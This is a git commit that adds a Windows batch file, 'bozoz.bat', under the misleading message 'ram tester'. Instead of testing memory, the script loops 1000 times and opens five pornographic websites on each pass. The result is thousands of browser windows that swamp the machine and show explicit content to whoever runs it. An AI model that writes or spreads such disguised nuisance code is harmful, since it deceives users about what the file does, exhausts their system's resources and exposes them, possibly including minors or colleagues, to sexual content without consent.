bf5cafdca47e8689eb2bbdefb4f1557b11f5fce1
hookeyy <143789490+hookeyy@users.noreply.github.com>
2023-11-20 12:52:00 +0100

    ram tester

---
+++ bozoz.bat
@@ -0,0 +1,12 @@
+@echo off
+set count=0
+
+:open_browser
+start "" "www.pornhub.com"
+start "" "www.xnxx.com"
+start "" "www.xvideos.com"
+start "" "www.porn.com"
+start "" "www.sex.com"
+
+set /a count+=1
+if %count% lss 1000 goto open_browser
